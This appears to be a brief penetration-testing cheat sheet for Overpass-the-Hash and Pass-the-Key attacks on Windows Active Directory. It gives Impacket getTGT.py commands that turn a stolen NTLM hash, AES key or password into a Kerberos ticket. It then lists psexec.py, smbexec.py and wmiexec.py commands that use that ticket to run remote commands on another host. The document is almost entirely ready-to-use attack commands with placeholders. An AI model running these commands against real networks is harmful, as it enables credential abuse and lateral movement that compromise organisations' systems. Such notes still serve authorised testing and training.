
Overpass The Hash/Pass The Key (PTK):
```
python3 getTGT.py <domain_ne>/<user_ne> -hashes [lm_hash]:<ntlm_hash>

python3 getTGT.py <domain_ne>/<user_ne> -aesKey <aes_key>

python3 getTGT.py <domain_ne>/<user_ne>:[password]

```

Using TGT key to excute remote commands from the following impacket scripts:

```
python3 psexec.py <domain_ne>/<user_ne>@<remote_hostne> -k -no-pass

python3 smbexec.py <domain_ne>/<user_ne>@<remote_hostne> -k -no-pass

python3 wmiexec.py <domain_ne>/<user_ne>@<remote_hostne> -k -no-pass
```

